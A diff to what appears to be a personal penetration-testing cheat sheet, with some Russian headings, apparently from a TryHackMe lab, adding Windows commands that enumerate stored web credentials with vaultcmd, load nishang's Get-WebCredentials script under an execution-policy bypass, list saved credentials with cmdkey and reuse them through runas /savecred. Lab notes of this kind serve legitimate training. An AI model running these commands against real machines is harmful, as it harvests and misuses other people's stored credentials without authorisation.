@@ -2,11 +2,19 @@
 
 # Credential Manager
 
-vaultcmd /list
+    # web credentials
+    
+    vaultcmd /list
+    VaultCmd /listproperties:"Web Credentials"
+    VaultCmd /listcreds:"Web Credentials"
+    https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
+    powershell -ex bypass
+    Import-Module C:\Tools\Get-WebCredentials.ps1
+    Get-WebCredentials
 
-# Посмотреть сохраненный креды
-
-cmdkey /list
+    # Посмотреть сохраненный креды windows
+    cmdkey /list
+    runas /savecred /user:THM.red\thm-local cmd.exe
 
 # повышение привелегий серез UAC
 
